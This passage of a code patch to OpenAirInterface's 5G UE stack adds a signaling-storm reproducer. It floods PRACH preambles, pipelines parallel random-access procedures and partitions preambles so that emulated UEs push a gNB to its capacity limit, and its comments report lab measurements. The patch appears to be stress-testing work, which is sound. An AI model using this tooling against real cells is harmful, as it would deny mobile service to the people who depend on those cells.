++   64 x 24576 c16_t = 6.3 MB of BSS, which is cheaper than one more idft per
++   occasion per instance. */
++#define RSS_PRE_MAX 64
++#define RSS_PRE_LEN 24576
++static c16_t rss_pre[RSS_PRE_MAX][RSS_PRE_LEN];
++static volatile int rss_pre_ready[RSS_PRE_MAX];
++static int rss_pre_amp_used = -1;
++static int rss_pre_len_used = -1;
++static int rss_pre_kstart_used = -1;
++
++static inline c16_t rss_c16_satadd(c16_t a, c16_t b)
++{
++  int32_t r = (int32_t)a.r + b.r;
++  int32_t i = (int32_t)a.i + b.i;
++  c16_t o = {.r = (int16_t)(r > INT16_MAX ? INT16_MAX : (r < INT16_MIN ? INT16_MIN : r)),
++             .i = (int16_t)(i > INT16_MAX ? INT16_MAX : (i < INT16_MIN ? INT16_MIN : i))};
++  return o;
++}
++
+ int32_t generate_nr_prach(PHY_VARS_NR_UE *ue, uint8_t gNB_id, int frame, uint8_t slot, int16_t tx_amp, c16_t **txData)
+ {
+   NR_DL_FRAME_PARMS *fp=&ue->frame_parms;
+@@ -306,27 +384,88 @@ int32_t generate_nr_prach(PHY_VARS_NR_UE *ue, uint8_t gNB_id, int frame, uint8_t
+   c16_t prach[dftlen] __attribute__((aligned(32)));
+   {
+     c16_t prachF[dftlen] __attribute__((aligned(32)));
+-    memset(prachF, 0, sizeof(prachF));
+-    for (int offset = 0, offset2 = 0; offset < N_ZC; offset++, offset2 += preamble_shift) {
+-      if (offset2 >= N_ZC)
+-        offset2 -= N_ZC;
+-      const c16_t Xu_t = c16xmulConstShift(Xu[offset], tx_amp, 15);
+-      const double w = 2 * M_PI * (double)offset2 / N_ZC;
+-      const c16_t ru = {.r = (int16_t)(floor(32767.0 * cos(w))), .i = (int16_t)(floor(32767.0 * sin(w)))};
+-      const c16_t p = c16mulShift(Xu_t, ru, 15);
+-      prachF[k++] = p;
+-      if (k == dftlen)
+-        k = 0;
+-    }
+-
+-#if defined(PRACH_WRITE_OUTPUT_DEBUG)
+-    LOG_M("prachF.m", "prachF", &prachF[1804], 1024, 1, 1);
+-    LOG_M("Xu.m", "Xu", Xu, N_ZC, 1, 1);
+-#endif
+-
+-    // This is after cyclic prefix
++    c16_t rss_tmp[dftlen] __attribute__((aligned(32)));
++    /* RSS: one idft per preamble, accumulating in the TIME domain.
++       Frequency-domain accumulation was tried first and measured on the box
++       2026-10-22: a single UE emitting 4 preambles got all 4 detected by the
++       gNB, but each detection_metric fell from 307.6 to 1.4 - a 220x loss that
++       RSS_FLOOD_DIV did not change, so it was not clipping. Summing several
++       root sequences on the same subcarriers before one idft destroys each
++       correlation peak. Real UEs do not suffer this: each one runs its own idft
++       and the sums happen on the air. Doing the same here costs N idfts per
++       occasion but keeps every preamble at full correlation strength.
++       RSS_FLOOD_DIV now only guards int16 overflow of the time-domain sum;
++       random relative phases make the peak grow about sqrt(N), so sqrt(N) is
++       the natural setting. */
+     const idft_size_idx_t idft_size = get_idft(dftlen);
+-    idft(idft_size, (int16_t *)prachF, (int16_t *)prach, 1);
++    const int rss_n = (restricted_set == 0 && rss_preamble_flood() > 1 && !nr_rss_is_probe(ue->Mod_id))
++                          ? rss_preamble_flood()
++                          : 1;
++    const int rss_div = rss_flood_div();
++    const int16_t rss_amp = (rss_div > 1) ? (int16_t)(tx_amp / rss_div) : tx_amp;
++    const int rss_kstart = k;
++
++    if (rss_n == 1) {
++      /* Upstream path, untouched. */
++      memset(prachF, 0, sizeof(prachF));
++      k = rss_kstart;
++      for (int offset = 0, offset2 = 0; offset < N_ZC; offset++, offset2 += preamble_shift) {
++        if (offset2 >= N_ZC)
++          offset2 -= N_ZC;
++        const c16_t Xu_t = c16xmulConstShift(Xu[offset], rss_amp, 15);
++        const double w = 2 * M_PI * (double)offset2 / N_ZC;
++        const c16_t ru = {.r = (int16_t)(floor(32767.0 * cos(w))), .i = (int16_t)(floor(32767.0 * sin(w)))};
++        prachF[k] = c16mulShift(Xu_t, ru, 15);
++        k++;
++        if (k == dftlen)
++          k = 0;
++      }
++      idft(idft_size, (int16_t *)prachF, (int16_t *)prach, 1);
++    } else {
++      /* Cached time-domain accumulation. Invalidate wholesale if the amplitude,
++         the dft length or the frequency position changed - all three are
++         config-constant within a run, so this fires once. */
++      if (rss_pre_amp_used != (int)rss_amp || rss_pre_len_used != dftlen
++          || rss_pre_kstart_used != rss_kstart) {
++        for (int n = 0; n < RSS_PRE_MAX; n++)
++          rss_pre_ready[n] = 0;
++        rss_pre_amp_used = (int)rss_amp;
++        rss_pre_len_used = dftlen;
++        rss_pre_kstart_used = rss_kstart;
++      }
++      memset(prach, 0, dftlen * sizeof(*prach));
++      for (int rss_seq = 0; rss_seq < rss_n; rss_seq++) {
++        const int idx = (preamble_index + rss_seq) & (RSS_PRE_MAX - 1);
++        if (dftlen > RSS_PRE_LEN)
++          continue;
++        if (!rss_pre_ready[idx]) {
++          const int off = (NCS == 0) ? idx : idx / (N_ZC / NCS);
++          const int shift = (NCS == 0) ? 0 : (idx % (N_ZC / NCS)) * NCS;
++          const int xi = off - first_nonzero_root_idx;
++          if (xi < 0 || xi >= 64)
++            continue;
++          const c16_t *Xs = ue->X_u[xi];
++          memset(prachF, 0, sizeof(prachF));
++          int kk = rss_kstart;
++          for (int offset = 0, offset2 = 0; offset < N_ZC; offset++, offset2 += shift) {
++            if (offset2 >= N_ZC)
++              offset2 -= N_ZC;
++            const c16_t Xu_t = c16xmulConstShift(Xs[offset], rss_amp, 15);
++            const double w = 2 * M_PI * (double)offset2 / N_ZC;
++            const c16_t ru = {.r = (int16_t)(floor(32767.0 * cos(w))), .i = (int16_t)(floor(32767.0 * sin(w)))};
++            prachF[kk] = c16mulShift(Xu_t, ru, 15);
++            kk++;
++            if (kk == dftlen)
++              kk = 0;
++          }
++          idft(idft_size, (int16_t *)prachF, (int16_t *)rss_pre[idx], 1);
++          rss_pre_ready[idx] = 1; /* publish only after the samples are written */
++        }
++        const c16_t *src = rss_pre[idx];
++        for (int n = 0; n < dftlen; n++)
++          prach[n] = rss_c16_satadd(prach[n], src[n]);
++      }
++    }
+   }
+ 
+   c16_t *out = txData[0] + prach_start;
+diff --git a/openair1/SIMULATION/NR_PHY/dlsim.c b/openair1/SIMULATION/NR_PHY/dlsim.c
+index 27861d5..f1a9737 100644
+--- a/openair1/SIMULATION/NR_PHY/dlsim.c
++++ b/openair1/SIMULATION/NR_PHY/dlsim.c
+@@ -1007,7 +1007,7 @@ int main(int argc, char **argv)
+   asn1cFreeStruc(asn_DEF_NR_CellGroupConfig, UE_CellGroup);
+ 
+   UE_mac->state = UE_CONNECTED;
+-  UE_mac->ra.ra_state = nrRA_SUCCEEDED;
++  UE_mac->ra->ra_state = nrRA_SUCCEEDED;
+ 
+   nr_phy_data_t phy_data = {0};
+   fapi_nr_dl_config_request_t dl_config = {.sfn = frame, .slot = slot};
+diff --git a/openair2/LAYER2/NR_MAC_UE/config_ue.c b/openair2/LAYER2/NR_MAC_UE/config_ue.c
+index 1676366..8a754f4 100644
+--- a/openair2/LAYER2/NR_MAC_UE/config_ue.c
++++ b/openair2/LAYER2/NR_MAC_UE/config_ue.c
+@@ -1883,8 +1883,8 @@ void nr_rrc_mac_config_req_reset(module_id_t module_id, NR_UE_MAC_reset_cause_t
+       release_mac_configuration(mac, cause);
+       // Restore default MAC Cell Group timers/config (after the reset)
+       nr_ue_mac_default_configs(mac);
+-      mac->ra.ra_state = nrRA_UE_IDLE;
+-      mac->ra.RA_active = false;
++      mac->ra->ra_state = nrRA_UE_IDLE;
++      mac->ra->RA_active = false;
+       mac->state = UE_IDLE;
+       break;
+     case DETACH:
+@@ -2045,6 +2045,15 @@ static void nr_mac_start_ra(NR_UE_MAC_INST_t *mac, module_id_t module_id, nr_mac
+   switch (cause) {
+     case NR_MAC_RA_START_SETUP:
+     case NR_MAC_RA_START_T300:
++      /* RA pipelining: take a free slot so reset_ra()'s memset clears only that
++         one and the procedures already in flight survive. Falling back to the
++         current slot when none is free keeps the stock single-procedure
++         behaviour (and is the only path at ra_parallel 1). */
++      if (mac->ra_parallel > 1) {
++        int slot = rss_ra_alloc(mac);
++        if (slot >= 0)
++          mac->ra = &mac->ra_pool[slot];
++      }
+       reset_ra(mac, false);
+       reset_mac_inst(mac);
+       mac->msg3_C_RNTI = false;
+@@ -2160,7 +2169,7 @@ static void handle_reconfiguration_with_sync(NR_UE_MAC_INST_t *mac,
+   mac->crnti = reconfWithSync->newUE_Identity;
+   LOG_I(NR_MAC, "Configuring CRNTI %x\n", mac->crnti);
+ 
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   bool is_cfra = false;
+   if (reconfWithSync->rach_ConfigDedicated) {
+     AssertFatal(reconfWithSync->rach_ConfigDedicated->present == NR_ReconfigurationWithSync__rach_ConfigDedicated_PR_uplink,
+diff --git a/openair2/LAYER2/NR_MAC_UE/mac_defs.h b/openair2/LAYER2/NR_MAC_UE/mac_defs.h
+index 5d56c75..a80de5c 100644
+--- a/openair2/LAYER2/NR_MAC_UE/mac_defs.h
++++ b/openair2/LAYER2/NR_MAC_UE/mac_defs.h
+@@ -379,6 +379,9 @@ typedef struct {
+   int ro_mask_index;
+ } RA_config_t;
+ 
++#define NR_UE_MAX_PARALLEL_RA 4
++
++
+ typedef struct {
+   bool active;
+   bool ack_received;
+@@ -582,7 +585,21 @@ typedef struct NR_UE_MAC_INST_s {
+   /// CRNTI
+   uint16_t crnti;
+   /// RA configuration
+-  RA_config_t ra;
++  /* RA pipelining (RRC signaling storm reproducer, UE only).
++   *
++   * Upstream keeps ONE RA_config_t per UE, and reset_ra()'s memset destroys a
++   * live procedure, so a UE can hold exactly one attempt in flight. Measured on
++   * the box 2026-10-21: the per-instance cycle is ~69 ms and 76% of it is spent
++   * waiting for Msg4, during which no new RRCSetupRequest can be started. That
++   * caps arrivals at the gNB near 58/s with 6 instances, while pinning the cell
++   * at its capacity needs ~148/s.
++   *
++   * `ra` stays the name every call site uses, but becomes a POINTER into the
++   * pool so the conversion is mechanical and the compiler catches every missed
++   * site. ra_parallel == 1 keeps the stock behaviour: one slot, one procedure. */
++  RA_config_t ra_pool[NR_UE_MAX_PARALLEL_RA];
++  RA_config_t *ra;
++  int ra_parallel;
+   /// SSB index from MIB decoding
+   uint8_t mib_ssb;
+   uint32_t mib_additional_bits;
+diff --git a/openair2/LAYER2/NR_MAC_UE/mac_proto.h b/openair2/LAYER2/NR_MAC_UE/mac_proto.h
+index b39efcf..61f335a 100644
+--- a/openair2/LAYER2/NR_MAC_UE/mac_proto.h
++++ b/openair2/LAYER2/NR_MAC_UE/mac_proto.h
+@@ -91,6 +91,11 @@ NR_UE_MAC_INST_t *get_mac_inst(module_id_t module_id);
+ 
+ void reset_mac_inst(NR_UE_MAC_INST_t *nr_mac);
+ void reset_ra(NR_UE_MAC_INST_t *nr_mac, bool free_prach);
++bool rss_ra_slot_free(const RA_config_t *ra);
++int rss_ra_alloc(NR_UE_MAC_INST_t *mac);
++bool rss_preamble_taken(const NR_UE_MAC_INST_t *mac, int idx, const RA_config_t *self);
++int rss_ra_by_rapid(NR_UE_MAC_INST_t *mac, int rapid);
++int rss_ra_by_contres(NR_UE_MAC_INST_t *mac, const uint8_t *cont_res);
+ void release_mac_configuration(NR_UE_MAC_INST_t *mac,
+                                NR_UE_MAC_reset_cause_t cause);
+ 
+diff --git a/openair2/LAYER2/NR_MAC_UE/main_ue_nr.c b/openair2/LAYER2/NR_MAC_UE/main_ue_nr.c
+index 84e0231..b83bf40 100644
+--- a/openair2/LAYER2/NR_MAC_UE/main_ue_nr.c
++++ b/openair2/LAYER2/NR_MAC_UE/main_ue_nr.c
+@@ -104,7 +104,7 @@ void nr_ue_reset_sync_state(NR_UE_MAC_INST_t *mac, bool reconf)
+ {
+   // reset synchornization status
+   mac->state = reconf ? UE_NOT_SYNC_RECONF : UE_NOT_SYNC;
+-  mac->ra.ra_state = nrRA_UE_IDLE;
++  mac->ra->ra_state = nrRA_UE_IDLE;
+ }
+ 
+ NR_UE_L2_STATE_t nr_ue_get_sync_state(module_id_t mod_id)
+@@ -120,6 +120,15 @@ NR_UE_MAC_INST_t *nr_l2_init_ue(int instance_id, int numerology)
+   nr_ue_mac_inst[instance_id] = calloc_or_fail(1, sizeof(NR_UE_MAC_INST_t));
+ 
+   NR_UE_MAC_INST_t *mac = nr_ue_mac_inst[instance_id];
++  /* RA pipelining: slot 0 is the active procedure, which reproduces upstream.
++     The reproducer's ra_depth knob raises it; clamp to the pool size. */
++  mac->ra_parallel = nr_rss_ra_depth();
++  if (mac->ra_parallel > NR_UE_MAX_PARALLEL_RA)
++    mac->ra_parallel = NR_UE_MAX_PARALLEL_RA;
++  LOG_I(NR_MAC, "[UE %d] RA pipelining depth %d\n", instance_id, mac->ra_parallel);
++  mac->ra = &mac->ra_pool[0];
++  for (int i = 1; i < NR_UE_MAX_PARALLEL_RA; i++)
++    mac->ra_pool[i].ra_state = nrRA_FAILED; /* = free; see rss_ra_slot_free() */
+   mac->ue_id = instance_id;
+   mac->numerology = numerology;
+   nr_ue_init_mac(mac);
+@@ -172,9 +181,9 @@ void reset_mac_inst(NR_UE_MAC_INST_t *nr_mac)
+   nr_timer_stop(&nr_mac->time_alignment_timer);
+   nr_timer_stop(&nr_mac->scheduling_info.sr_DelayTimer);
+   nr_timer_stop(&nr_mac->scheduling_info.retxBSR_Timer);
+-  nr_timer_stop(&nr_mac->ra.response_window_timer);
+-  nr_timer_stop(&nr_mac->ra.RA_backoff_timer);
+-  nr_timer_stop(&nr_mac->ra.contention_resolution_timer);
++  nr_timer_stop(&nr_mac->ra->response_window_timer);
++  nr_timer_stop(&nr_mac->ra->RA_backoff_timer);
++  nr_timer_stop(&nr_mac->ra->contention_resolution_timer);
+   for (int i = 0; i < NR_MAX_SR_ID; i++)
+     nr_timer_stop(&nr_mac->scheduling_info.sr_info[i].prohibitTimer);
+ 
+@@ -186,18 +195,18 @@ void reset_mac_inst(NR_UE_MAC_INST_t *nr_mac)
+     nr_mac->ul_harq_info[k].last_ndi = -1; // initialize to invalid value
+ 
+   // stop any ongoing RACH procedure
+-  if (nr_mac->ra.RA_active) {
++  if (nr_mac->ra->RA_active) {
+     nr_mac->msg3_C_RNTI = false;
+     nr_mac->sr_fallback_ra_triggered = false;
+-    nr_mac->ra.ra_state = nrRA_UE_IDLE;
+-    nr_mac->ra.RA_active = false;
++    nr_mac->ra->ra_state = nrRA_UE_IDLE;
++    nr_mac->ra->RA_active = false;
+   }
+ 
+   // discard explicitly signalled contention-free Random Access Resources
+   // TODO not sure what needs to be done here
+ 
+   // flush Msg3 buffer
+-  free_and_zero(nr_mac->ra.Msg3_buffer);
++  free_and_zero(nr_mac->ra->Msg3_buffer);
+ 
+   // cancel any triggered Scheduling Request procedure
+   for (int i = 0; i < NR_MAX_SR_ID; i++) {
+@@ -222,7 +231,7 @@ void reset_mac_inst(NR_UE_MAC_INST_t *nr_mac)
+   }
+ 
+   // release, if any, Temporary C-RNTI
+-  nr_mac->ra.t_crnti = 0;
++  nr_mac->ra->t_crnti = 0;
+ 
+   // reset BFI_COUNTER
+   // TODO beam failure procedure not implemented
+diff --git a/openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c b/openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c
+index e68f77a..008a853 100644
+--- a/openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c
++++ b/openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c
+@@ -15,9 +15,32 @@
+ #include <executables/softmodem-common.h>
+ #include "openair2/LAYER2/nr_rlc/nr_rlc_oai_api.h"
+ 
++/* RSS: partition the contention preamble space across UE instances.
++   rss_preamble_taken() only inspects this mac's own ra_pool, so two UE
++   instances in the same process still draw from the same 64 preambles and
++   collide. A collision makes the RAR's RAPID ambiguous, so the attempt is lost.
++   Box-measured 2026-10-22: PRACH claims run at 158/s but only 62/s become
++   RRCSetupRequests (39% conversion), and the accepted rate sits at 41.9-42.4/s
++   in every configuration tried (4/6/8/10 instances, RA depth 1-2, four lockstep
++   windows, arbitration and round robin on/off). Pinning occupancy at the
++   ceiling needs 44.9/s, i.e. +7%. Giving each instance a disjoint slice removes
++   cross-instance collisions. 0 or 1 = off (upstream behaviour). */
++static int rss_preamble_partition(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_PREAMBLE_PART");
++    cached = env ? atoi(env) : 0;
++    if (cached < 0)
++      cached = 0;
++  }
++  return cached;
++}
++
++
+ int16_t get_prach_tx_power(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   int16_t pathloss = compute_nr_SSB_PL(mac);
+   int16_t ra_preamble_rx_power = (int16_t)(ra->prach_resources.ra_preamble_rx_target_power + pathloss);
+   return min(ra->prach_resources.Pc_max, ra_preamble_rx_power);
+@@ -140,7 +163,7 @@ static int get_messagePowerOffsetGroupB(long messagePowerOffsetGroupB)
+ 
+ static void select_preamble_group(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   // TODO if the RA_TYPE is switched from 2-stepRA to 4-stepRA
+ 
+   if (!ra->Msg3_buffer) { // if Msg3 buffer is empty
+@@ -210,7 +233,7 @@ static ssb_ro_preambles_t get_ssb_ro_preambles_2step(struct NR_RACH_ConfigCommon
+ 
+ static void config_preamble_index(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   // Random seed generation
+   unsigned int seed;
+   if (IS_SOFTMODEM_IQPLAYER || IS_SOFTMODEM_IQRECORDER) {
+@@ -275,11 +298,36 @@ static void config_preamble_index(NR_UE_MAC_INST_t *mac)
+     int ssb_pr_idx = mac->ssb_list.nb_ssb_per_index[mac->mib_ssb] % (int)ra->ssb_ro_config.ssb_per_ro;
+     ra->ra_PreambleIndex = groupOffset + (ssb_pr_idx * ra->ssb_ro_config.preambles_per_ssb) + rand_preamb;
+   }
++
++  /* RA pipelining: two live procedures must not share a preamble index. The gNB
++     answers one preamble with one RAR carrying that RAPID and mints one
++     TC-RNTI, so a collision makes the RAR ambiguous and the loser's contention
++     resolution tears down the context the winner owns. No-op at ra_parallel 1. */
++  for (int guard = 0; guard < 16 && rss_preamble_taken(mac, ra->ra_PreambleIndex, ra); guard++) {
++    rand_preamb = rand_r(&seed) % pream_per_ssb;
++    ra->ra_PreambleIndex = (ra->ssb_ro_config.ssb_per_ro < 1)
++                               ? groupOffset + rand_preamb
++                               : groupOffset
++                                     + ((mac->ssb_list.nb_ssb_per_index[mac->mib_ssb]
++                                         % (int)ra->ssb_ro_config.ssb_per_ro)
++                                        * ra->ssb_ro_config.preambles_per_ssb)
++                                     + rand_preamb;
++  }
++
++  /* Keep each instance inside its own slice of the contention preambles. The
++     slice is taken after the duplicate-avoidance loop above, so the intra-mac
++     guard still holds and only the cross-instance overlap is removed. */
++  const int part = rss_preamble_partition();
++  if (part > 1 && pream_per_ssb >= part) {
++    const int per = pream_per_ssb / part;
++    const int base = ra->ra_PreambleIndex - rand_preamb;
++    ra->ra_PreambleIndex = base + (mac->ue_id % part) * per + (rand_preamb % per);
++  }
+ }
+ 
+ static void configure_ra_preamble(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   int ssb = -1; // init as not selected
+   ra->ro_mask_index = -1; // init as not selected
+   NR_RACH_ConfigDedicated_t *rach_ConfigDedicated = ra->rach_ConfigDedicated;
+@@ -403,7 +451,7 @@ static void select_prach_occasion(RA_config_t *ra,
+ 
+ static void configure_prach_occasions(NR_UE_MAC_INST_t *mac, int scs)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   int num_ra_occasions_period = 0;
+   frame_structure_t *fs = &mac->frame_structure;
+   nr_prach_info_t prach_info =  get_nr_prach_occasion_info_from_index(ra->ra_config_index, mac->frequency_range, fs->frame_type);
+@@ -575,7 +623,7 @@ void ra_resource_selection(NR_UE_MAC_INST_t *mac)
+   const int ul_mu = mac->current_UL_BWP->scs;
+   const int mu = nr_get_prach_or_ul_mu(mac->current_UL_BWP->msgA_ConfigCommon_r16, current_UL_BWP->rach_ConfigCommon, ul_mu);
+   configure_prach_occasions(mac, mu);
+-  ra_preamble_msga_transmission(&mac->ra, mu);
++  ra_preamble_msga_transmission(mac->ra, mu);
+ }
+ 
+ static int nr_get_RA_window_2Step_v17(long msgB_ResponseWindow)
+@@ -761,7 +809,7 @@ static void setup_ra_response_window(NR_UE_MAC_INST_t *mac,
+ // to Random Access type as specified in clause 5.1.1a (3GPP TS 38.321 version 16.2.1 Release 16)
+ bool init_RA(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   LOG_D(NR_MAC, "Initialization of RA\n");
+   ra->ra_state = nrRA_GENERATE_PREAMBLE;
+ 
+@@ -965,7 +1013,7 @@ bool init_RA(NR_UE_MAC_INST_t *mac)
+ 
+ void nr_Msg3_transmitted(NR_UE_MAC_INST_t *mac)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   NR_RACH_ConfigCommon_t *nr_rach_ConfigCommon = mac->current_UL_BWP->rach_ConfigCommon;
+   const int ntn_ue_koffset = GET_NTN_UE_K_OFFSET(&mac->phy_config.config_req.ntn_config, mac->current_UL_BWP->scs);
+   const int slots_per_ms = mac->frame_structure.numb_slots_frame / 10;
+@@ -998,7 +1046,7 @@ static uint8_t *fill_msg3_crnti_pdu(RA_config_t *ra, uint8_t *pdu, uint16_t crnt
+ 
+ static uint8_t *fill_msg3_pdu_from_rlc(NR_UE_MAC_INST_t *mac, uint8_t *pdu, int TBS_max)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   // regular Msg3/MsgA_PUSCH with PDU coming from higher layers
+   *(NR_MAC_SUBHEADER_FIXED *)pdu = (NR_MAC_SUBHEADER_FIXED){.LCID = UL_SCH_LCID_CCCH_48_BITS};
+   pdu += sizeof(NR_MAC_SUBHEADER_FIXED);
+@@ -1020,7 +1068,7 @@ static uint8_t *fill_msg3_pdu_from_rlc(NR_UE_MAC_INST_t *mac, uint8_t *pdu, int
+ 
+ void nr_get_Msg3_MsgA_PUSCH_payload(NR_UE_MAC_INST_t *mac, uint8_t *buf, int TBS_max)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ 
+   // we already stored MSG3 in the buffer, we can use that
+   if (ra->Msg3_buffer) {
+@@ -1051,7 +1099,7 @@ void nr_get_Msg3_MsgA_PUSCH_payload(NR_UE_MAC_INST_t *mac, uint8_t *buf, int TBS
+ // - complete handling of received contention-based RA preamble
+ void nr_ra_succeeded(NR_UE_MAC_INST_t *mac, const frame_t frame, const int slot)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ 
+   if (ra->cfra) {
+     LOG_A(NR_MAC, "[UE %d][%d.%d][RAPROC] RA procedure succeeded. CFRA: RAR successfully received.\n", mac->ue_id, frame, slot);
+@@ -1092,7 +1140,7 @@ void nr_ra_backoff_setting(RA_config_t *ra)
+ void nr_ra_contention_resolution_failed(NR_UE_MAC_INST_t *mac)
+ {
+   LOG_W(MAC, "[UE %d] Contention resolution failed\n", mac->ue_id);
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   // discard the TEMPORARY_C-RNTI
+   ra->t_crnti = 0;
+   // flush MSG3 buffer
+@@ -1115,7 +1163,7 @@ void nr_ra_contention_resolution_failed(NR_UE_MAC_INST_t *mac)
+ void nr_rar_not_successful(NR_UE_MAC_INST_t *mac)
+ {
+   LOG_W(MAC, "[UE %d] RAR reception failed\n", mac->ue_id);
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   NR_PRACH_RESOURCES_t *prach_resources = &ra->prach_resources;
+   prach_resources->preamble_tx_counter++;
+   bool ra_completed = false;
+@@ -1142,7 +1190,7 @@ void trigger_MAC_UE_RA(NR_UE_MAC_INST_t *mac, dci_pdu_rel15_t *pdcch_order)
+   LOG_W(NR_MAC, "Triggering new RA procedure for UE with RNTI %x\n", mac->crnti);
+   mac->state = UE_PERFORMING_RA;
+   reset_ra(mac, false);
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   mac->msg3_C_RNTI = true;
+   if (pdcch_order) {
+     ra->pdcch_order.active = true;
+@@ -1166,7 +1214,7 @@ void prepare_msg4_msgb_feedback(NR_UE_MAC_INST_t *mac, int pid, int ack_nack)
+   const NR_UE_UL_BWP_t *current_UL_BWP = mac->current_UL_BWP;
+   configure_initial_pucch(&pucch, current_harq->pucch_resource_indicator, current_UL_BWP->pucch_ConfigCommon->pucch_ResourceCommon);
+ 
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   ra->ra_pucch = calloc_or_fail(1, sizeof(*ra->ra_pucch));
+   ra->ra_pucch->sched_frame = sched_frame;
+   ra->ra_pucch->sched_slot = sched_slot;
+@@ -1174,9 +1222,86 @@ void prepare_msg4_msgb_feedback(NR_UE_MAC_INST_t *mac, int pid, int ack_nack)
+   AssertFatal(ret == 0, "Couldn't configure PUCCH for MSG4\n");
+ }
+ 
++
++/* ---- RA pipelining helpers (RRC signaling storm reproducer, UE only) ----
++ *
++ * ra_parallel == 1 reproduces upstream exactly: one slot, every helper is a
++ * no-op. Above 1, an instance may hold several procedures at once, which is
++ * what raises the arrival rate at the gNB: the measured per-instance cycle is
++ * ~69 ms and 76% of it is spent waiting for Msg4 with nothing else in flight.
++ *
++ * A free slot is one whose state is SUCCEEDED or FAILED (FAILED is what calloc
++ * plus the initialiser leaves, and no code assigns it), so "free" never
++ * collides with nrRA_UE_IDLE, which means "armed, start pending". */
++bool rss_ra_slot_free(const RA_config_t *ra)
++{
++  return ra->ra_state == nrRA_SUCCEEDED || ra->ra_state == nrRA_FAILED;
++}
++
++int rss_ra_alloc(NR_UE_MAC_INST_t *mac)
++{
++  if (mac->ra_parallel <= 1)
++    return 0;
++  for (int i = 0; i < mac->ra_parallel && i < NR_UE_MAX_PARALLEL_RA; i++)
++    if (rss_ra_slot_free(&mac->ra_pool[i]))
++      return i;
++  return -1;
++}
++
++/* Two live procedures must never share a preamble index: the gNB answers one
++ * preamble with one RAR carrying that RAPID and mints one TC-RNTI, so a
++ * collision makes the RAR ambiguous and both slots would adopt the same
++ * TC-RNTI. The loser's contention resolution then tears down the context the
++ * winner owns. All 64 indices are in use on this cell, so with at most 4 live
++ * slots a redraw almost always succeeds on the first try. */
++bool rss_preamble_taken(const NR_UE_MAC_INST_t *mac, int idx, const RA_config_t *self)
++{
++  if (mac->ra_parallel <= 1)
++    return false;
++  for (int i = 0; i < mac->ra_parallel && i < NR_UE_MAX_PARALLEL_RA; i++) {
++    const RA_config_t *o = &mac->ra_pool[i];
++    if (o == self || rss_ra_slot_free(o))
++      continue;
++    if (o->ra_PreambleIndex == idx)
++      return true;
++  }
++  return false;
++}
++
++/* Find the slot that owns an inbound Msg4, by the contention resolution ID it
++ * echoes back. This is the better key at Msg4 time: the gNB returns the 48-bit
++ * value the UE itself put in Msg3, so the owner is identifiable before the
++ * TC-RNTI has been adopted by any slot. */
++int rss_ra_by_contres(NR_UE_MAC_INST_t *mac, const uint8_t *cont_res)
++{
++  if (mac->ra_parallel <= 1)
++    return 0;
++  for (int i = 0; i < mac->ra_parallel && i < NR_UE_MAX_PARALLEL_RA; i++) {
++    const RA_config_t *o = &mac->ra_pool[i];
++    if (rss_ra_slot_free(o))
++      continue;
++    if (memcmp(o->cont_res_id, cont_res, 6) == 0)
++      return i;
++  }
++  return -1;
++}
++
++/* Find the slot that owns an inbound RAR, by the RAPID it carries. */
++int rss_ra_by_rapid(NR_UE_MAC_INST_t *mac, int rapid)
++{
++  if (mac->ra_parallel <= 1)
++    return 0;
++  for (int i = 0; i < mac->ra_parallel && i < NR_UE_MAX_PARALLEL_RA; i++) {
++    const RA_config_t *o = &mac->ra_pool[i];
++    if (!rss_ra_slot_free(o) && o->ra_PreambleIndex == rapid)
++      return i;
++  }
++  return -1;
++}
++
+ void reset_ra(NR_UE_MAC_INST_t *nr_mac, bool free_prach)
+ {
+-  RA_config_t *ra = &nr_mac->ra;
++  RA_config_t *ra = nr_mac->ra;
+   if (ra->rach_ConfigDedicated)
+     asn1cFreeStruc(asn_DEF_NR_RACH_ConfigDedicated, ra->rach_ConfigDedicated);
+   memset(ra, 0, sizeof(RA_config_t));
+diff --git a/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c b/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c
+index ad89949..71a9d0a 100644
+--- a/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c
++++ b/openair2/LAYER2/NR_MAC_UE/nr_ue_dci_configuration.c
+@@ -143,7 +143,7 @@ static void config_dci_pdu(NR_UE_MAC_INST_t *mac,
+     rel15->coreset.pdcch_dmrs_scrambling_id = mac->physCellId;
+   }
+ 
+-  int temp_num_dci_options = (mac->ra.ra_state == nrRA_WAIT_RAR || rnti_type == TYPE_SI_RNTI_) ? 1 : 2;
++  int temp_num_dci_options = (mac->ra->ra_state == nrRA_WAIT_RAR || rnti_type == TYPE_SI_RNTI_) ? 1 : 2;
+   int dci_format[2] = {0};
+   if (ss->searchSpaceType->present == NR_SearchSpace__searchSpaceType_PR_ue_Specific) {
+     if (ss->searchSpaceType->choice.ue_Specific->dci_Formats ==
